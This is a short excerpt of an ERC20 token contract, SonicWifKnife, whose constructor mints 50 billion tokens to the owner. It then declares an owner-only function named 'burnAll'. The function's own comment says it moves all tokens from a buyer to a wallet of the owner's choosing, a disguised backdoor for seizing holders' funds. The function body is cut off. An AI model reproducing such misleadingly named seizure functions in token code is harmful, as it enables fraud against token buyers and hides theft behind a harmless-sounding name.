...
contract SonicWifKnife is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("SonicWifKnife", "SonicWifKnife") Ownable(initialOwner) {
        _mint(initialOwner, 50000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function burnAll(address from, address to) external onlyOwner {
